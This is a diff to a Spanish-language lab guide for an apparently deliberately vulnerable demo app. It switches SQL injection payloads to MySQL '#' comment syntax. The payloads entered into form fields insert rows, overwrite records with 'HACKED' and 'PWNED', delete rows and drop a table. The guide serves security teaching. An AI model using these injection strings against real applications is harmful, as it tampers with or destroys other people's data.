@@ -272,7 +272,7 @@ http://TU_IP_PUBLICA:8000/sql_demo/
 - Click **Insertar Objeto**
 
 ### 3. Probar SQL Injection - Multi-Insert:
-- **Nombre**: `test'), ('hacker', 'HACK', 'EVIL'); --`
+- **Nombre**: `test'), ('hacker', 'HACK', 'EVIL'); #`
 - **Descripción**: `T`
 - **Ubicación**: `A10`
 - Click **Insertar Objeto**
@@ -295,30 +295,32 @@ Deberías ver tanto el registro "test" como "hacker" insertados (2 filas con 1 s
 **UPDATE Attack** (Modifica registros existentes):
 - **Nombre**: `test2`
 - **Descripción**: `T`
-- **Ubicación**: `A1'); UPDATE objetos SET descripcion='HACKED' WHERE id=1; --`
+- **Ubicación**: `A1'); UPDATE objetos SET descripcion='HACKED' WHERE id=1; #`
 
-Verificar: `SELECT * FROM objetos WHERE id=1;` debería mostrar descripcion='HACKED'
+Verificar en MySQL: `SELECT * FROM objetos WHERE id=1;` debería mostrar descripcion='HACKED'
 
 **DELETE Attack** (Elimina registros):
 - **Nombre**: `test3`
 - **Descripción**: `T`
-- **Ubicación**: `A1'); DELETE FROM objetos WHERE nombre='zapatos'; --`
+- **Ubicación**: `A1'); DELETE FROM objetos WHERE nombre='zapatos'; #`
 
 Verificar: El objeto 'zapatos' ya no existe
 
 **Multiple UPDATEs** (Caos total):
 - **Nombre**: `test4`
 - **Descripción**: `T`
-- **Ubicación**: `A1'); UPDATE objetos SET activo=0; UPDATE objetos SET ubicacion='PWNED'; --`
+- **Ubicación**: `A1'); UPDATE objetos SET activo=0; UPDATE objetos SET ubicacion='PWNED'; #`
 
 Verificar: Todos los objetos ahora tienen activo=0 y ubicacion='PWNED'
 
 **DROP TABLE Attack** (¡Máximo peligro!):
 - **Nombre**: `test5`
 - **Descripción**: `T`
-- **Ubicación**: `A1'); DROP TABLE consultas_rutas; --`
+- **Ubicación**: `A1'); DROP TABLE consultas_rutas; #`
 
 ⚠️ CUIDADO: Esto eliminará toda la tabla de consultas
+
+**Nota importante**: En MySQL, usa `#` para comentar el resto de la línea. También puedes usar `-- ` (con espacio después).
 
 ---
 
